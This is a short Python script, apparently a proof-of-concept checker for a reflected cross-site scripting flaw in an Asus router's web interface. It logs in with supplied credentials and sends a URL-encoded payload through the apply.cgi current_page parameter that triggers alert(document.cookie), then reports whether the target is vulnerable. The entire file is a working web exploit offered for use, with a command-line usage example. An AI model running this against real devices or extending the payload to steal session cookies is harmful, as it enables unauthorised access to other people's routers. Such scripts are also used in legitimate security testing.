import requests
import sys
import re
import base64
from colorama import Fore

description= r"""
 -----------------------------------------------------------------------------
|                                                                            |
|                                                                            |
|                                                                            |
|                                 Hyo-In                                     |
|                                                                            |
|                                                                            |
|                                                                            |
 -----------------------------------------------------------------------------
"""
def packet(target, port, cookie):
	try:
		#Login
		URL = 'http://'+target+':'+port+'/'
		headers = {'Cookie' : 'traffic_warning_NaN=2019.11:1', 'Authorization' : 'Basic ' + cookie}
		s = requests.Session()
		req = s.get(URL, headers=headers)

		URL = 'http://'+target+':'+port+'/apply.cgi?current_page=%22%3E%3Cbody%20onload=alert%28document.cookie%29%3E'
		req = s.get(URL, headers=headers)
		
	
		if req.status_code == 200 and re.search('document.cookie', req.text):
			print (Fore.GREEN+" [+] Vulnarable"+Fore.RESET)
		else:
			print (Fore.YELLOW+" [-] Not Vulnarable"+Fore.RESET)

	except:
		print(Fore.YELLOW+" [-] Not Vulnarable"+Fore.RESET)
		pass


# MAIN
if __name__ == "__main__":
	print description
	if len(sys.argv) is not 5:
		print(Fore.YELLOW+" [-] Example: python Asus_XSS.py <Target IP> <port> <ID> <Password>"+Fore.RESET)
		sys.exit(1)
	else:
		cookie = base64.encodestring(sys.argv[3]+':'+sys.argv[4]).rstrip('\n')
		packet(sys.argv[1], sys.argv[2], cookie)
